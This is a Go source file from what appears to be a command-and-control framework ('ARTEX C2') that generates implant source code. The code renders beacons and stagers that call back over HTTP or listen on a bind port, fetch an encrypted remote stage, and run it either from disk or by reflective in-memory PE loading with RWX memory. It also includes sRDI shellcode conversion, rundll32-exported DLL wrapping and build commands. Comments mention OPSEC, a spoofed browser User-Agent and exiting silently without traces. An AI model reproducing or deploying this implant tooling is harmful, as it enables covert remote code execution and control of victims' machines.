	bootstrap := srdiBootstrap(is64, functionHash, flags, len(dllBytes), len(userData))
	want := 69
	if !is64 {
		want = 50
	}
	if len(bootstrap) != want {
		return nil, fmt.Errorf("srdi: bootstrap 长度异常 %d(应为 %d)", len(bootstrap), want)
	}
	out := make([]byte, 0, len(bootstrap)+len(loader)+len(dllBytes)+len(userData))
	out = append(out, bootstrap...)
	out = append(out, loader...)
	out = append(out, dllBytes...)
	out = append(out, userData...)
	return out, nil
}

// ---- 3. 编译型产物源码渲染 ----

// MatrixSource 描述一次渲染出的 Go 源码工程。
type MatrixSource struct {
	Filename string // 源码 zip 建议名(渲染期为 zip;构建产物名由构建管线按 artifact 定)
	Zip      []byte // 已打包好的源码 zip(reverse 路径直接复用 RenderPayload 产物;nil = 用 MainGo/BuildMD 打包)
	MainGo   string // main.go 源码文本(Zip 为 nil 时参与打包)
	BuildMD  string // BUILD.md 文本
}

// ZipBeaconSource 把 main.go + BUILD.md 打成内存 zip(导出包装,供 server 构建管线用;
// 与 beacon.go 的 zipGoSource 同一实现)。
func ZipBeaconSource(mainGo []byte, buildMd string) ([]byte, error) {
	return zipGoSource(string(mainGo), buildMd)
}

// zipExtractFile 从 zip 包里取一个文件的字节(reverse 路径从 RenderPayload 的源码
// zip 里取 main.go 做 c-shared 包装用)。
func zipExtractFile(zipBytes []byte, name string) (string, error) {
	zr, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		return "", err
	}
	for _, f := range zr.File {
		if f.Name != name {
			continue
		}
		rc, rerr := f.Open()
		if rerr != nil {
			return "", rerr
		}
		defer rc.Close() //nolint:errcheck
		var buf bytes.Buffer
		if _, cerr := buf.ReadFrom(rc); cerr != nil {
			return "", cerr
		}
		return buf.String(), nil
	}
	return "", fmt.Errorf("源码 zip 内没有 %s", name)
}

// RenderArtifactSource 渲染「完整 beacon」编译型产物的 Go 源码工程:
//   - exe reverse:直接复用 RenderPayload("gosrc") 的协议感知渲染管线(Agent T
//     维护四传输信道段,本文件零重复);
//   - exe bind:gosrc 模板 + 本文件注入的 bind 信道段(goBindChannelBlock:目标机
//     监听 bind_port,平台经 NewOutboundConn 正向连入,帧格式同 §18 tcp;首帧 reg);
//   - dll:同方向源码经 asCSharedSource 包装(//export Run 入口,cgo)。
//
// shellcode 的 stage 用 dll(由调用方选 artifact=dll);ebpf 由构建管线拼装。
func RenderArtifactSource(artifact, direction, target string, l *Listener, key []byte, bindPort int) (*MatrixSource, error) {
	if l == nil {
		return nil, errors.New("监听器为空")
	}
	if len(key) != keySize {
		return nil, fmt.Errorf("密钥长度 %d 字节,需 %d", len(key), keySize)
	}
	if !ValidPayloadDirection(direction) {
		return nil, fmt.Errorf("无效连接方向: %q", direction)
	}
	if err := ValidateBindPort(direction, bindPort); err != nil {
		return nil, err
	}
	switch artifact {
	case ArtifactExe, ArtifactDll:
	default:
		return nil, fmt.Errorf("RenderArtifactSource 仅支持 exe/dll 产物: %q", artifact)
	}

	var mainGo, buildDoc string
	var readyZip []byte // 非 nil:直接作为源码 zip 落盘(RenderPayload 原样产物)
	if direction == DirectionReverse {
		// reverse:走 RenderPayload 管线(http/ws/tcp/kcp/oss 信道段由 Agent T 维护),
		// 从源码 zip 里取 main.go,保证与脚本载荷的 beacon 逻辑逐字节同源。
		_, zipBytes, _, err := RenderPayload("gosrc", target, l, key)
		if err != nil {
			return nil, err
		}
		mainGo, err = zipExtractFile(zipBytes, "main.go")
		if err != nil {
			return nil, err
		}
		readyZip = zipBytes
		buildDoc = gosrcBuildDoc(target, transportName(l.Proto))
	} else {
		// bind:同源模板 + bind 信道段(平台主动连入;帧 = 4B 大端长度 + 裸密文)。
		base := renderTemplate(gosrcTemplate, map[string]string{
			"__CALLBACK__":         goStr(strings.TrimRight(strings.TrimSpace(l.Callback), "/")),
			"__URL_PATH__":         goStr(strings.Trim(l.URLPath, "/")),
			"__B64KEY__":           goStr(base64.StdEncoding.EncodeToString(key)),
			"__LISTENER_ID__":      strconv.FormatInt(l.ID, 10),
			"__OS_EXEC_IMPORT__":   quotedExecImport(),
			"__GO_EXTRA_IMPORTS__": "\"encoding/binary\"\n\t\"sync\"",
			"__GO_CHANNEL__":       renderTemplate(goBindChannelBlock, map[string]string{"__BIND_PORT__": strconv.Itoa(bindPort)}),
		})
		// 主循环起监听协程(锚点是一期主循环首行;缺失即报错,不产出半成品)。
		const bootAnchor = "\tsleep, jit, fails := 10, 20, 0\n"
		if strings.Count(base, bootAnchor) != 1 {
			return nil, errors.New("bind 渲染锚点缺失:beacon 主循环首行")
		}
		base = strings.Replace(base, bootAnchor, bootAnchor+"\tgo bindAcceptor()\n", 1)
		if ph := findGosrcPlaceholder(base); ph != "" {
			return nil, fmt.Errorf("bind 源码占位符未替换: %s", ph)
		}
		mainGo = base
		buildDoc = bindBuildDoc(target, bindPort)
	}
	switch artifact {
	case ArtifactExe:
		return &MatrixSource{
			Filename: fmt.Sprintf("beacon_%d.zip", l.ID),
			Zip:      readyZip,
			MainGo:   mainGo,
			BuildMD:  buildDoc,
		}, nil
	case ArtifactDll:
		src, cerr := asCSharedSource(mainGo)
		if cerr != nil {
			return nil, fmt.Errorf("生成 c-shared 源码失败: %w", cerr)
		}
		return &MatrixSource{
			Filename: fmt.Sprintf("beacon_cshared_%d.zip", l.ID),
			MainGo:   src,
			BuildMD:  csharedBuildDoc(target),
		}, nil
	}
	return nil, fmt.Errorf("未知产物: %q", artifact)
}

// findGosrcPlaceholder 检查 gosrc 渲染产物是否残留占位符(渠道段注入后必须清零)。
func findGosrcPlaceholder(src string) string {
	for _, ph := range []string{"__GO_CHANNEL__", "__GO_EXTRA_IMPORTS__", "__CALLBACK__", "__URL_PATH__", "__B64KEY__", "__LISTENER_ID__", "__OS_EXEC_IMPORT__", "__BIND_PORT__"} {
		if strings.Contains(src, ph) {
			return ph
		}
	}
	return ""
}

// RenderStagerSource 渲染 staged 产物的「极简 stager」Go 源码工程:
//   - reverse:stager 走 HTTP 回连信道,循环发 stage_get 拉齐 stage;
//   - bind:stager 在目标机监听 bind_port,平台正向连入后按 tcp 帧送 stage;
//   - stageArtifact=exe:stage 落盘执行(契约标注 OPSEC 弱);
//   - stageArtifact=dll:stage 反射加载进内存(staged shellcode 链路:stager 以
//     c-shared 构建 DLL 后,平台侧经 ConvertDLLToShellcode 转 shellcode)。
func RenderStagerSource(stageArtifact, direction, target string, l *Listener, key []byte, token string, bindPort int) (*MatrixSource, error) {
	if l == nil {
		return nil, errors.New("监听器为空")
	}
	if len(key) != keySize {
		return nil, fmt.Errorf("密钥长度 %d 字节,需 %d", len(key), keySize)
	}
	if strings.TrimSpace(token) == "" {
		return nil, errors.New("stager 缺少投递令牌(token)")
	}
	if !ValidPayloadDirection(direction) {
		return nil, fmt.Errorf("无效连接方向: %q", direction)
	}
	switch stageArtifact {
	case ArtifactExe, ArtifactDll:
	default:
		return nil, fmt.Errorf("stager 的 stage 产物仅支持 exe/dll: %q", stageArtifact)
	}
	if err := ValidateBindPort(direction, bindPort); err != nil {
		return nil, err
	}
	cb := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
	if direction == DirectionReverse && cb == "" {
		return nil, errors.New("监听器未配置回调地址(callback),请先在监听器上填写再生成载荷")
	}

	vars := map[string]string{
		"__B64KEY__":    goStr(base64.StdEncoding.EncodeToString(key)),
		"__TOKEN__":     goStr(token),
		"__CALLBACK__":  goStr(cb),
		"__URL_PATH__":  goStr(strings.Trim(l.URLPath, "/")),
		"__BIND_PORT__": strconv.Itoa(bindPort),
	}
	mainGo := assembleStagerSource(direction, stageArtifact)
	for k, v := range vars {
		mainGo = strings.ReplaceAll(mainGo, k, v)
	}
	if stageArtifact == ArtifactDll {
		// staged shellcode 链路:stager 以 c-shared DLL 交付(//export Run),
		// 平台构建管线再经 ConvertDLLToShellcode 转为 shellcode。
		wrapped, werr := asCSharedSource(mainGo)
		if werr != nil {
			return nil, fmt.Errorf("生成 c-shared stager 源码失败: %w", werr)
		}
		mainGo = wrapped
	}
	if ph := findStagerPlaceholder(mainGo); ph != "" {
		return nil, fmt.Errorf("stager 模板占位符未替换: %s", ph)
	}
	ext := ""
	if stageArtifact == ArtifactDll {
		ext = "_cshared"
	}
	return &MatrixSource{
		Filename: fmt.Sprintf("stager%s_%d.zip", ext, l.ID),
		MainGo:   mainGo,
		BuildMD:  stagerBuildDoc(stageArtifact, direction, target, bindPort),
	}, nil
}

// stagerPlaceholderPhrases 是全部 stager 模板占位符(渲染后必须一个不剩)。
var stagerPlaceholderPhrases = []string{
	"__B64KEY__", "__TOKEN__", "__CALLBACK__", "__URL_PATH__", "__BIND_PORT__",
}

func findStagerPlaceholder(src string) string {
	for _, ph := range stagerPlaceholderPhrases {
		if strings.Contains(src, ph) {
			return ph
		}
	}
	return ""
}

// assembleStagerSource 按变体拼装 stager 单文件源码。
// 每个区块自带「它用到的 import」清单,汇总去重成唯一 import 块——从机制上杜绝
// 组合变体下的漏 import/未用 import(单一占位模板做不到这一点)。
func assembleStagerSource(direction, stageArtifact string) string {
	imports := map[string]bool{
		"crypto/aes":          true, // sealRaw/openRaw
		"crypto/cipher":       true,
		`crand "crypto/rand"`: true,
		"encoding/base64":     true, // mustB64 / 分片 b64
		"encoding/json":       true,
		"errors":              true,
		"time":                true, // 主循环退避
	}
	var b strings.Builder
	b.WriteString(stagerPreamble)
	b.WriteString(stagerCommonCode)
	if direction == DirectionBind {
		imports["encoding/binary"] = true // 帧长度前缀
		imports["io"] = true              // io.ReadFull
		imports["net"] = true
		imports["sync"] = true
		imports["fmt"] = true
		b.WriteString(stagerBindExchangeCode)
	} else {
		imports["bytes"] = true
		imports["io"] = true
		imports["net/http"] = true
		imports["fmt"] = true
		imports["strings"] = true
		b.WriteString(stagerHTTPExchangeCode)
	}
	mainCode := stagerReverseMainCode
	if direction == DirectionBind {
		mainCode = stagerBindMainCode
	}
	if stageArtifact == ArtifactDll {
		// 内存反射加载:LE 读写 + windows API + 裸指针。
		imports["encoding/binary"] = true
		imports["runtime"] = true
		imports["syscall"] = true
		imports["unsafe"] = true
		b.WriteString(stagerReflectBlock)
	} else {
		// 落盘执行:进程执行 import 按纪律动态拼接(本包不出现该路径字面量)。
		imports["fmt"] = true
		imports["os"] = true
		imports["path/filepath"] = true
		imports["runtime"] = true
		imports[quotedExecImport()] = true
		b.WriteString(strings.Replace(stagerDiskBlock, "__EXEC_CMD_START__", "exec.Command(p)", 1))
	}
	b.WriteString(mainCode)

	// 汇总 import(排序去重;别名/已带引号的键原样写,纯路径加引号)。
	keys := make([]string, 0, len(imports))
	for k := range imports {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var out strings.Builder
	out.WriteString("package main\n\nimport (\n")
	for _, k := range keys {
		if strings.Contains(k, `"`) {
			out.WriteString("\t" + k + "\n")
		} else {
			out.WriteString("\t" + `"` + k + `"` + "\n")
		}
	}
	out.WriteString(")\n\n")
	out.WriteString(b.String())
	return out.String()
}

// stagerPreamble 是 stager 源码头注释。
const stagerPreamble = `// ARTEX C2 stager(三期 §19 staged 产物,演示用,契约 C2_CONTRACTS.md §19)。
// 极简一次性加载器:按所选信道拉齐 stage(stager_get/stage_data 消息对)→
// 执行 stage → 进程退出。不留驻、不建会话;会话由完整 stage beacon 建立。
`

// stagerCommonCode 是两种信道共用的段:信封原语 + stage_get 分片拉取循环。
const stagerCommonCode = `// ---------- 信封原语(与完整 beacon 同密钥/同信封,t=stage_get) ----------

func mustB64(s string) []byte {
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}

func sealRaw(v any) ([]byte, error) {
	plain, err := json.Marshal(v)
	if err != nil {
		return nil, err
	}
	blk, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(blk)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, 12)
	if _, err := crand.Read(nonce); err != nil {
		return nil, err
	}
	return g.Seal(nonce, nonce, plain, nil), nil
}

func openRaw(sealed []byte) (map[string]any, error) {
	if len(sealed) < 12 {
		return nil, errors.New("stager: 密文过短")
	}
	blk, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	g, err := cipher.NewGCM(blk)
	if err != nil {
		return nil, err
	}
	plain, err := g.Open(nil, sealed[:12], sealed[12:], nil)
	if err != nil {
		return nil, err
	}
	var m map[string]any
	if err := json.Unmarshal(plain, &m); err != nil {
		return nil, err
	}
	return m, nil
}

func stageGetEnvelope(offset, ln int64) map[string]any {
	nb := make([]byte, 16)
	_, _ = crand.Read(nb)
	return map[string]any{
		"t":  "stage_get",
		"ts": time.Now().Unix(),
		"nc": hex2str(nb),
		"d":  map[string]any{"tok": stageTok, "of": offset, "ln": ln},
	}
}

// hex2str 16 字节随机数转 hex(防重放 nc;本地实现省一个 import 分歧点)。
func hex2str(b []byte) string {
	const digits = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, c := range b {
		out = append(out, digits[c>>4], digits[c&0x0f])
	}
	return string(out)
}

// fetchStage 循环拉取 t=stage_data 分片(b64 + eof)直至收齐。
func fetchStage() ([]byte, error) {
	var out []byte
	for {
		req, serr := sealRaw(stageGetEnvelope(int64(len(out)), chunkLn))
		if serr != nil {
			return nil, serr
		}
		resp, cerr := channelExchange(req)
		if cerr != nil {
			return nil, cerr
		}
		d, _ := resp["d"].(map[string]any)
		var b64s string
		if d != nil {
			b64s, _ = d["b"].(string)
		}
		chunk, derr := base64.StdEncoding.DecodeString(b64s)
		if derr != nil {
			return nil, derr
		}
		out = append(out, chunk...)
		eof := false
		if d != nil {
			eof, _ = d["eof"].(bool)
		}
		if eof {
			return out, nil
		}
		if len(out) > 64<<20 {
			return nil, errors.New("stager: stage 超过 64MB 上限")
		}
	}
}
`

// stagerHTTPExchangeCode:reverse 信道(HTTP 回连,与一期逐字节兼容)。
const stagerHTTPExchangeCode = `// ---------- reverse 信道:HTTP 回连 ----------

const (
	cbAddr   = __CALLBACK__
	upPath   = __URL_PATH__
	stageTok = __TOKEN__
	ua       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	chunkLn  = 256 << 10
)

var key = mustB64(__B64KEY__)

var client = &http.Client{Timeout: 40 * time.Second}

func channelURL() string {
	u := strings.TrimSuffix(cbAddr, "/")
	if p := strings.Trim(upPath, "/"); p != "" {
		u += "/" + p
	}
	return u + "/e"
}

// channelExchange:body = base64(密文),响应同格式。
func channelExchange(sealed []byte) (map[string]any, error) {
	req, err := http.NewRequest(http.MethodPost, channelURL(),
		bytes.NewReader([]byte(base64.StdEncoding.EncodeToString(sealed))))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", ua)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("http %d", resp.StatusCode)
	}
	rsealed, derr := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if derr != nil {
		return nil, derr
	}
	return openRaw(rsealed)
}
`

// stagerBindExchangeCode:bind 信道(目标机监听,平台正向连入;帧格式同 §18 tcp:
// 4 字节 big-endian 长度 + 裸密文)。
const stagerBindExchangeCode = `// ---------- bind 信道:目标机监听,平台连入后按帧交换 ----------

const (
	stageTok = __TOKEN__
	bindPort = "__BIND_PORT__"
	chunkLn  = 256 << 10
)

var key = mustB64(__B64KEY__)

var (
	bindMu   sync.Mutex
	bindConn net.Conn
)

func bindActiveConn() net.Conn {
	bindMu.Lock()
	defer bindMu.Unlock()
	return bindConn
}

// waitConn 阻塞等平台连入(单连接语义:新连接替换旧连接)。
func waitConn() net.Conn {
	for {
		c := bindActiveConn()
		if c != nil {
			return c
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func acceptLoop() {
	for {
		ln, lerr := net.Listen("tcp", ":"+bindPort)
		if lerr != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		for {
			c, aerr := ln.Accept()
			if aerr != nil {
				break
			}
			bindMu.Lock()
			old := bindConn
			bindConn = c
			bindMu.Unlock()
			if old != nil {
				_ = old.Close()
			}
		}
		_ = ln.Close()
	}
}

// channelExchange:写 stage_get 帧,读 stage_data 帧(裸密文,无 base64)。
func channelExchange(sealed []byte) (map[string]any, error) {
	c := waitConn()
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(sealed)))
	if _, err := c.Write(append(hdr, sealed...)); err != nil {
		return nil, err
	}
	fh := make([]byte, 4)
	if _, err := io.ReadFull(c, fh); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(fh)
	if n == 0 || n > 8<<20 {
		return nil, fmt.Errorf("stager: 非法帧长 %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		return nil, err
	}
	return openRaw(buf)
}
`

// stagerDiskBlock:stage 落盘执行(staged exe;契约 §19 标注 OPSEC 弱)。
// 进程执行 import 由调用方按 quotedExecImport() 拼接——本包源码不出现该字面量。
const stagerDiskBlock = `// ---------- stage 执行:落盘执行(OPSEC 弱,契约已标注) ----------

func runStage(stage []byte) {
	ext := ""
	if runtime.GOOS == "windows" {
		ext = ".exe"
	}
	p := filepath.Join(os.TempDir(), fmt.Sprintf("svc_%d%s", time.Now().UnixNano()%100000000, ext))
	if werr := os.WriteFile(p, stage, 0o700); werr != nil {
		return
	}
	if runtime.GOOS != "windows" {
		_ = os.Chmod(p, 0o700)
	}
	cmd := __EXEC_CMD_START__
	_ = cmd // 火力交给 stage,自身退出
}
`

// stagerReflectBlock:stage 内存反射加载(staged shellcode 链路;仅 windows x64 PE32+)。
const stagerReflectBlock = `// ---------- stage 执行:内存反射加载(教育用途的最小 PE 加载器;windows x64) ----------

func le16(b []byte, off int) uint16 { return binary.LittleEndian.Uint16(b[off : off+2]) }
func le32(b []byte, off int) uint32 { return binary.LittleEndian.Uint32(b[off : off+4]) }
func le64(b []byte, off int) uint64 { return binary.LittleEndian.Uint64(b[off : off+8]) }
func put64(b []byte, off int, v uint64) { binary.LittleEndian.PutUint64(b[off:off+8], v) }

func cStr(img []byte, off int) []byte {
	if off <= 0 || off >= len(img) {
		return nil
	}
	end := off + 256
	if end > len(img) {
		end = len(img)
	}
	for i := off; i < end; i++ {
		if img[i] == 0 {
			return img[off:i]
		}
	}
	return nil
}

func runStage(stage []byte) { reflectLoad(stage) }

func reflectLoad(dll []byte) {
	if runtime.GOOS != "windows" || len(dll) < 0x40 {
		return
	}
	k32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := k32.NewProc("VirtualAlloc")
	loadLibraryA := k32.NewProc("LoadLibraryA")
	getProcAddress := k32.NewProc("GetProcAddress")

	peOff := int(le32(dll, 0x3c))
	if peOff <= 0 || peOff+24 > len(dll) || dll[peOff] != 'P' || dll[peOff+1] != 'E' || dll[peOff+2] != 0 || dll[peOff+3] != 0 {
		return
	}
	coff := peOff + 4
	nSec := int(le16(dll, coff+2))
	optSize := int(le16(dll, coff+16))
	opt := coff + 20
	if optSize < 112 || opt+optSize > len(dll) || le16(dll, opt) != 0x20b {
		return // 仅 PE32+
	}
	imageBase := le64(dll, opt+24)
	sizeOfImage := le32(dll, opt+56)
	sizeOfHeaders := le32(dll, opt+60)
	entryRVA := le32(dll, opt+16)
	if sizeOfImage == 0 || int(sizeOfHeaders) > len(dll) || int(sizeOfHeaders) < 0x40 {
		return
	}

	base, _, _ := virtualAlloc.Call(0, uintptr(sizeOfImage), 0x3000, 0x40)
	if base == 0 {
		return
	}
	img := unsafe.Slice((*byte)(unsafe.Pointer(base)), sizeOfImage)
	copy(img[:sizeOfHeaders], dll[:sizeOfHeaders])
	sec0 := opt + optSize
	for i := 0; i < nSec; i++ {
		sh := sec0 + i*40
		if sh+40 > len(dll) {
			break
		}
		vs := int(le32(dll, sh+8))
		va := int(le32(dll, sh+12))
		rs := int(le32(dll, sh+16))
		ro := int(le32(dll, sh+20))
		if rs < vs {
			vs = rs
		}
		if va+vs > len(img) || ro+vs > len(dll) {
			continue
		}
		copy(img[va:va+vs], dll[ro:ro+vs])
	}

	// 基址重定位(BASE RELOCATION,只处理 DIR64 类型)。
	delta := base - uintptr(imageBase)
	relocRVA := int(le32(dll, opt+112))
	relocSize := int(le32(dll, opt+116))
	if delta != 0 && relocRVA > 0 && relocRVA+relocSize <= len(img) {
		off := relocRVA
		for off+8 <= relocRVA+relocSize {
			page := le32(img, off)
			blockSize := int(le32(img, off+4))
			if blockSize < 8 || off+blockSize > relocRVA+relocSize {
				break
			}
			for e := off + 8; e+2 <= off+blockSize; e += 2 {
				entry := le16(img, e)
				if entry>>12 != 10 {
					continue
				}
				p := int(page) + int(entry&0xfff)
				if p+8 <= len(img) {
					put64(img, p, le64(img, p)+uint64(delta))
				}
			}
			off += blockSize
		}
	}

	// 导入表(IAT)解析:LoadLibraryA + GetProcAddress 回填。
	iatRVA := int(le32(dll, opt+128))
	iatSize := int(le32(dll, opt+132))
	if iatRVA > 0 && iatRVA+iatSize <= len(img) {
		off := iatRVA
		for off+20 <= iatRVA+iatSize {
			oft := le32(img, off)
			nameRVA := le32(img, off+12)
			ft := le32(img, off+16)
			if nameRVA == 0 {
				break
			}
			dllName := cStr(img, int(nameRVA))
			if dllName == nil {
				break
			}
			mod, _, _ := loadLibraryA.Call(uintptr(unsafe.Pointer(&dllName[0])))
			lookup := oft
			if lookup == 0 {
				lookup = ft
			}
			i, w := int(lookup), int(ft)
			for i+8 <= len(img) && w+8 <= len(img) {
				thunk := le64(img, i)
				if thunk == 0 {
					break
				}
				var proc uintptr
				if thunk&(1<<63) != 0 {
					proc, _, _ = getProcAddress.Call(mod, uintptr(thunk&0xffff))
				} else {
					fn := cStr(img, int(thunk&0xffffffff)+2)
					if fn != nil {
						proc, _, _ = getProcAddress.Call(mod, uintptr(unsafe.Pointer(&fn[0])))
					}
				}
				put64(img, w, uint64(proc))
				i += 8
				w += 8
			}
			off += 20
		}
	}

	// DllMain(base, DLL_PROCESS_ATTACH, 0)。
	if entryRVA > 0 {
		syscall.SyscallN(base+uintptr(entryRVA), base, 1, 0)
	}
}
`

// stagerReverseMainCode:reverse 变体主入口(第一次交换即回连)。
const stagerReverseMainCode = `
func main() {
	var stage []byte
	var err error
	for attempt := 0; attempt < 6; attempt++ {
		stage, err = fetchStage()
		if err == nil {
			break
		}
		time.Sleep(time.Duration(3*(attempt+1)) * time.Second)
	}
	if err != nil {
		return // 拉不到 stage 静默退出,不留现场
	}
	runStage(stage)
}
`

// stagerBindMainCode:bind 变体主入口(先起监听协程,再进入拉取循环)。
const stagerBindMainCode = `
func main() {
	go acceptLoop()
	var stage []byte
	var err error
	for attempt := 0; attempt < 120; attempt++ {
		stage, err = fetchStage()
		if err == nil {
			break
		}
		time.Sleep(time.Second)
	}
	if err != nil {
		return // 拉不到 stage 静默退出
	}
	runStage(stage)
}
`

// ---- 3.1 源码变换(bind 注入 / c-shared 包装)----

// asCSharedSource 把单文件 beacon main.go 包装成 c-shared 库源码:
//   - import "C" 前置说明块;
//   - func main → func beaconRun(库模式下 beacon 循环由导出函数驱动);
//   - 追加 //export Run 入口(契约 §19:dll 导出 Run,rundll32/加载器调用)
//     与 c-shared 必需的空 main。
func asCSharedSource(mainGo string) (string, error) {
	if strings.Count(mainGo, "func main() {") != 1 {
		return "", errors.New("源码 func main 不唯一,拒绝包装")
	}
	var head, rest string
	if pi := strings.Index(mainGo, "\npackage main\n"); pi >= 0 {
		head = mainGo[:pi+1]
		rest = mainGo[pi+len("\npackage main\n"):]
	} else if strings.HasPrefix(mainGo, "package main\n") {
		head = ""
		rest = mainGo[len("package main\n"):]
	} else {
		return "", errors.New("源码缺少 package main 行")
	}
	rest = strings.Replace(rest, "func main() {", "func beaconRun() {", 1)
	return head + "package main\n\n" +
		"/*\n#include <stdlib.h>\n*/\n" +
		"import \"C\"\n\n" +
		rest +
		"\n//export Run\n" +
		"// Run 是 DLL 的导出入口(契约 §19):启动 beacon/stager 逻辑,调用后阻塞;\n" +
		"// 在 rundll32 或加载器线程里调用;sleep/jitter 由平台会话 meta 驱动。\n" +
		"func Run() {\n\tbeaconRun()\n}\n\n" +
		"// c-shared 构建模式要求存在 main(cgo 不使用它)。\n" +
		"func main() {}\n", nil
}

// goBindChannelBlock 是 bind 方向的 beacon 信道段(注入 gosrc 模板的
// __GO_CHANNEL__ 槽位;复用模板公共段的 sealRaw/openRaw/newNC)。帧格式与 tcp
// 传输一致(契约 §18):4 字节 big-endian 长度 + 裸密文 nonce||ct;首帧必须是 reg。
const goBindChannelBlock = `// ---- bind 信道(三期 §19):beacon 在目标机监听,平台主动连入。 ----

const bindPort = "__BIND_PORT__"

var (
	bindMu   sync.Mutex
	bindConn net.Conn
)

func bindAcceptor() {
	for {
		ln, lerr := net.Listen("tcp", ":"+bindPort)
		if lerr != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		for {
			c, aerr := ln.Accept()
			if aerr != nil {
				break
			}
			bindMu.Lock()
			old := bindConn
			bindConn = c
			bindMu.Unlock()
			if old != nil {
				_ = old.Close()
			}
		}
		_ = ln.Close()
	}
}

func bindActiveConn() net.Conn {
	bindMu.Lock()
	defer bindMu.Unlock()
	return bindConn
}

func bindFrameWrite(sealed []byte) error {
	c := bindActiveConn()
	if c == nil {
		return errors.New("bind: 平台尚未连入")
	}
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(sealed)))
	if _, err := c.Write(append(hdr, sealed...)); err != nil {
		return err
	}
	return nil
}

func bindFrameRead() ([]byte, error) {
	c := bindActiveConn()
	if c == nil {
		return nil, errors.New("bind: 平台尚未连入")
	}
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(hdr)
	if n == 0 || n > 8<<20 {
		return nil, errors.New("bind: 非法帧长")
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// call 与 http 信道同签名:信封语义不变,密文走帧(裸密文)。
func call(t string, d any, sid string) (map[string]any, error) {
	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
	if sid != "" {
		env["sid"] = sid
	}
	if d != nil {
		env["d"] = d
	}
	sealed, serr := sealRaw(env)
	if serr != nil {
		return nil, serr
	}
	if werr := bindFrameWrite(sealed); werr != nil {
		return nil, werr
	}
	resp, rerr := bindFrameRead()
	if rerr != nil {
		return nil, rerr
	}
	return openRaw(resp)
}
`

// ---- 3.2 构建说明(BUILD.md)----

// csharedBuildDoc dll 产物的编译/使用说明(契约 §19:导出 Run,注明 rundll32 或加载器调用)。
func csharedBuildDoc(target string) string {
	var b strings.Builder
	b.WriteString("ARTEX C2 beacon DLL(c-shared,契约 §19)— 编译与使用说明\n\n")
	b.WriteString("导出入口:Run(启动完整 beacon 循环,阻塞调用线程)。\n\n")
	switch target {
	case "windows":
		b.WriteString("编译(需 mingw-w64 交叉 C 编译器):\n\n    CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -o beacon.dll main.go\n\n")
		b.WriteString("用法:\n\n    rundll32 beacon.dll,Run\n    或加载器 LoadLibrary + GetProcAddress(\"Run\") 调用。\n")
	case "linux":
		b.WriteString("编译(本机 gcc):\n\n    CGO_ENABLED=1 CC=gcc GOOS=linux GOARCH=amd64 go build -buildmode=c-shared -o beacon.so main.go\n\n")
		b.WriteString("用法:加载器 dlopen + dlsym(\"Run\") 调用。\n")
	default:
		b.WriteString("按目标平台选择 C 编译器后以 -buildmode=c-shared 构建,导出符号 Run。\n")
	}
	b.WriteString("\nsleep/jitter 由平台会话 meta 驱动,终止会话即 kl 退出。\n")
	return b.String()
}

// stagerBuildDoc staged stager 的编译/使用说明。
func stagerBuildDoc(stageArtifact, direction, target string, bindPort int) string {
	var b strings.Builder
	b.WriteString("ARTEX C2 stager(staged 产物,契约 C2_CONTRACTS.md §19)— 编译说明\n\n")
	if direction == DirectionBind {
		fmt.Fprintf(&b, "本 stager 为 bind 正向:在目标机监听 %d 端口,平台经「正向连接」送入 stage。\n\n", bindPort)
	} else {
		b.WriteString("本 stager 为 reverse 回连:拉取 stage 后执行并退出,不留驻、不建会话。\n\n")
	}
	if stageArtifact == ArtifactExe {
		b.WriteString("stage 执行方式:落盘执行(OPSEC 弱,契约已标注)。构建为普通可执行文件:\n\n")
		switch target {
		case "windows":
			b.WriteString("    GOOS=windows GOARCH=amd64 go build -trimpath -ldflags \"-s -w\" -o stager.exe main.go\n\n")
		case "linux":
			b.WriteString("    GOOS=linux GOARCH=amd64 go build -trimpath -ldflags \"-s -w\" -o stager main.go\n\n")
		default:
			b.WriteString("    GOOS=<windows|linux> GOARCH=amd64 go build -trimpath -ldflags \"-s -w\" -o stager main.go\n\n")
		}
	} else {
		b.WriteString("stage 执行方式:内存反射加载(staged shellcode 链路:平台先把本 stager 以\n")
		b.WriteString("c-shared 构建为 DLL,再经 sRDI(ConvertDLLToShellcode)转为 shellcode;Run 导出\n完成拉取+反射加载)。构建:\n\n")
		b.WriteString("    CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -o stager.dll main.go\n\n")
	}
	b.WriteString("产物仅标准库(staged shellcode 链路除外),无第三方依赖。\n")
	return b.String()
}

// ---- 4. eBPF 触发器源码资产(契约 §19 stretch:tc/XDP 魔法包触发器) ----
//
// VPS 构建管线(server/c2_build.go)取用:上传源码 → clang -target bpf 探测编译 →
